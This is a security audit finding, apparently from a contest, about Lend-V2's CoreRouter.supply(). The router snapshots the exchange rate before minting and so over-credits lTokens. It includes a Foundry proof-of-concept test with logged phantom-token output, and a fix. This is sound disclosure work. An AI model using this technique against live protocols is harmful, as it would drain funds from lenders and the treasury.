# Incorrect lToken Credit Calculation in CoreRouter.supply()

## Summary
Using the pre-mint exchange-rate snapshot will cause inflated lToken credits for every supplier and therefore an eventual shortfall for the protocol & honest users, a malicious supplier will be recorded with more lTokens than were ever minted and can later redeem or borrow against that phantom balance.

## Root Cause
In `CoreRouter.sol` the router fetches `exchangeRateStored()` before calling `LToken.mint()`, then calculates the expected lTokens and stores that value in `lendStorage.totalInvestment`.

**Reference**: [CoreRouter.sol#L80](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L80)

In `LToken.sol` (`mintInternal → mintFresh`) the `mint()` path first executes `accrueInterest()` and re-computes the exchange-rate after receiving the cash, minting fewer lTokens than the router assumed.

Because the router never checks its post-mint balance, `totalInvestment` drifts upward with every supply.

## Pre-conditions

### Internal Pre-conditions
1. A supplier calls `CoreRouter.supply(amount, token)` with `amount > 0`
2. Exchange rate inside the target LToken must change between the router's snapshot and the internal `mint()` calculation
3. This happens automatically because `mint()` calls `accrueInterest()` and `doTransferIn()` adds cash

### External Pre-conditions
N/A

## Impact
The protocol treasury and honest lenders suffer a loss equal to the cumulative over-credit—potentially *100% of surplus cash plus reserves.

## Proof of Concept

```solidity
function test_exchange_rate_discrepancy() public {  
    vm.startPrank(deployer);  

    // Setup  
    address token = supportedTokens[0];  
    address lToken = lendStorage.underlyingTolToken(token);  
    uint256 supplyAmount = 100e18; // Reduced amount to avoid overflow  

    // Mint initial tokens to deployer  
    ERC20Mock(token).mint(deployer, supplyAmount * 2); // Mint extra for borrowing  
    IERC20(token).approve(address(coreRouter), supplyAmount * 2);  

    // First supply to get initial exchange rate  
    coreRouter.supply(supplyAmount, token);  

    // Create a borrower and have them borrow to generate interest  
    address borrower = makeAddr("borrower");  
    vm.stopPrank();  
    vm.startPrank(borrower);  
      
    // Supply collateral for borrower  
    ERC20Mock(token).mint(borrower, supplyAmount);  
    IERC20(token).approve(address(coreRouter), supplyAmount);  
    coreRouter.supply(supplyAmount, token);  
      
    // Borrow to generate interest  
    coreRouter.borrow(supplyAmount / 2, token);  

    // Move time forward to accrue interest  
    vm.roll(block.number + 1000);  
    vm.warp(block.timestamp + 30 days);  

    vm.stopPrank();  
    vm.startPrank(deployer);  

    // Record balances before second supply  
    uint256 routerLTokensBefore = LTokenInterface(lToken).balanceOf(address(coreRouter));  
      
    // Get exchange rate before mint  
    uint256 exchangeRateBefore = LTokenInterface(lToken).exchangeRateStored();  
      
    // Do second supply  
    coreRouter.supply(supplyAmount, token);  

    // Calculate what router thinks it minted  
    uint256 expectedMintTokens = (supplyAmount * 1e18) / exchangeRateBefore;  
      
    // Get actual minted tokens  
    uint256 actualMintTokens = LTokenInterface(lToken).balanceOf(address(coreRouter)) - routerLTokensBefore;  

    // Get what's recorded in storage for this specific supply  
    uint256 storedInvestmentForThisSupply = expectedMintTokens; // This is what the router recorded  
    uint256 actualMintedForThisSupply = actualMintTokens; // This is what actually got minted  

    // Log all relevant values  
    console2.log("Exchange rate before:", exchangeRateBefore);  
    console2.log("Exchange rate after:", LTokenInterface(lToken).exchangeRateStored());  
    console2.log("Stored investment for this supply:", storedInvestmentForThisSupply);  
    console2.log("Actually minted for this supply:", actualMintedForThisSupply);  
    console2.log("Difference (phantom tokens):", storedInvestmentForThisSupply - actualMintedForThisSupply);  
      
    // The stored investment should be higher than actual minted amount  
    assertGt(storedInvestmentForThisSupply, actualMintedForThisSupply,   
        "Stored investment should be higher than actual minted amount due to exchange rate change");  

    // Calculate how much underlying can be redeemed with phantom tokens  
    uint256 phantomTokens = storedInvestmentForThisSupply - actualMintedForThisSupply;  
    uint256 exchangeRateAfter = LTokenInterface(lToken).exchangeRateStored();  
    uint256 excessRedeemable = (phantomTokens * exchangeRateAfter) / 1e18;  
    console2.log("Excess redeemable underlying:", excessRedeemable);  

    vm.stopPrank();  
}
```

### Test Results
```plaintext
[PASS] test_exchange_rate_discrepancy() (gas: 1074678)
Logs:  
  Exchange rate before: 200000000000000000000000000  
  Exchange rate after: 200002675513729496869944711  
  Stored investment for this supply: 500000000000  
  Actually minted for this supply: 499993311305  
  Difference (phantom tokens): 6688695  
  Excess redeemable underlying: 1337756895695304  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.77ms (785.17µs CPU time)
```

## Recommended Mitigation
Measure the actual lTokens minted:

```solidity
uint256 before = LTokenInterface(_lToken).balanceOf(address(this));  
require(LErc20Interface(_lToken).mint(_amount) == 0, "mint failed");  
uint256 mintTokens = LTokenInterface(_lToken).balanceOf(address(this)) - before;  
```